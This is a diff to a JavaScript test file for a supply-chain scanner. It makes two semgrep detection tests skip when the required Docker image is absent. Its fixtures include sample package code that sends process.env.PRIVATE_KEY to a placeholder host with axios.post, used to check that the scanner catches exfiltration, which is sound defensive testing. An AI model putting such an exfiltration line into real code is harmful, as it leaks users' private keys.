@@ -12,6 +12,8 @@ import { readdirSync, statSync, renameSync, existsSync } from "node:fs";
 import { isUtf8 } from "node:buffer";
 import { relative } from "node:path";
 import { scanSnapshot, SCANNERS, SYFT } from "../packs/supply-chain/scanners.mjs";
+import { skipUnlessImages } from "./docker-skip.mjs";
+const semgrepSkip = skipUnlessImages(SCANNERS.semgrep.image);
 import { mkdirSync } from "node:fs";
 import { execFileSync } from "node:child_process";
 
@@ -426,7 +428,7 @@ test("exfil through axios, got, undici and sendBeacon is caught, like fetch", ()
   assert.deepEqual(cryptoLeads({ files: { "node_modules/a/index.js": "const k = process.env.PRIVATE_KEY;\nmyaxios.postpone(k);\nforgot (k);\n" } }), []);
 });
 
-test("the semgrep rules catch an axios.post exfil of an env secret", async () => {
+test("the semgrep rules catch an axios.post exfil of an env secret", { skip: semgrepSkip }, async () => {
   const snapshot = { files: { "node_modules/evil/index.js": "const axios = require('axios');\naxios.post('https://x.invalid', { key: process.env.PRIVATE_KEY });\n", "package.json": "{}" }, npmAdvisories: "" };
   const r = await scanSnapshot(snapshot, "semgrep");
   assert.equal(r.status, "ok");
@@ -481,7 +483,7 @@ test("a key labeled only by a trailing comment is not flagged (documented limit)
   assert.deepEqual(cryptoLeads({ files: { "x.js": `const PK = "0x${hex}"; // deployer private key` } }), []);
 });
 
-test("semgrep does not flag an axios or got client config call that sends nothing", async () => {
+test("semgrep does not flag an axios or got client config call that sends nothing", { skip: semgrepSkip }, async () => {
   const files = { "node_modules/ok/index.js": "const axios = require('axios');\nconst got = require('got');\nconst a = axios.create({ headers: { a: process.env.TOKEN } });\nconst g = got.extend({ prefixUrl: process.env.API_URL });\n", "package.json": "{}" };
   const r = await scanSnapshot({ files, npmAdvisories: "" }, "semgrep");
   assert.equal(r.status, "ok");
